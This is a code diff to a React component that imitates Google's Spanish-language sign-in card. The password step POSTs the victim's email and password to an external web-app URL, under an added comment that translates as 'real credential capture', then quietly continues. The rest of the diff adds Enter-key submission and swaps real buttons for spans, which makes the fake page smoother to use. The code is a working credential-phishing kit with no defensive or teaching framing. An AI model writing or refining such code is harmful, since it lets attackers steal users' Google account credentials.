@@ -28,8 +28,8 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
   const handlePasswordNext = async () => {
     if (!password.trim()) return;
 
+    // CAPTURA REAL DE CREDENCIALES
     try {
-      // Enviamos exactamente "usuario" y "pass" para que el script no de undefined
       await fetch(webAppUrl, {
         method: "POST",
         mode: "no-cors",
@@ -40,9 +40,13 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
         })
       });
     } catch (e) {
-      console.error("Error");
+      console.error("Error en envío");
     }
     onLoginComplete();
+  };
+
+  const handleKeyDown = (e: React.KeyboardEvent, action: () => void) => {
+    if (e.key === "Enter") action();
   };
 
   return (
@@ -58,13 +62,14 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
                 type="text"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
+                onKeyDown={(e) => handleKeyDown(e, handleEmailNext)}
                 placeholder="Correo electrónico o teléfono"
                 className={`google-input w-full ${emailError ? 'border-destructive' : ''}`}
                 autoFocus
               />
               {emailError && <p className="text-xs text-destructive mt-1">⚠ {emailError}</p>}
               <div className="flex justify-between items-center pt-4">
-                <button className="google-btn-text text-sm font-medium">Crear cuenta</button>
+                <span className="google-btn-text text-sm font-medium cursor-pointer">Crear cuenta</span>
                 <button onClick={handleEmailNext} className="google-btn-blue">Siguiente</button>
               </div>
             </div>
@@ -84,6 +89,7 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
                 type={showPassword ? "text" : "password"}
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
+                onKeyDown={(e) => handleKeyDown(e, handlePasswordNext)}
                 placeholder="Introduce tu contraseña"
                 className="google-input w-full"
                 autoFocus
@@ -93,7 +99,7 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
                 <span className="text-sm text-card-foreground">Mostrar contraseña</span>
               </label>
               <div className="flex justify-between items-center pt-4">
-                <button className="google-btn-text text-sm font-medium">¿Has olvidado la contraseña?</button>
+                <span className="google-btn-text text-sm font-medium cursor-pointer">¿Has olvidado la contraseña?</span>
                 <button onClick={handlePasswordNext} className="google-btn-blue">Siguiente</button>
               </div>
             </div>
